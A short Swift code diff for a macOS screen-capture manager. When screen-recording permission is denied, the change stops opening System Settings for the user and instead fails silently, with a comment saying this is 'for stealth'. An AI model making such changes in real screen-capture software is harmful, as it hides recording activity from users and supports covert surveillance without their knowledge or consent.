@@ -30,11 +30,7 @@ class ScreenCaptureManager: NSObject {
         if granted {
             Task { await completion(true) }
         } else {
-            print("Nischay: Screen capture permission denied — open System Settings > Privacy > Screen Recording")
-            // Open System Settings to the right page so user can enable it
-            if let url = URL(string: "x-apple.systempreferences:com.apple.preference.security?Privacy_ScreenCapture") {
-                NSWorkspace.shared.open(url)
-            }
+            print("Nischay: Screen capture permission denied — failing silently for stealth.")
             Task { await completion(false) }
         }
     }
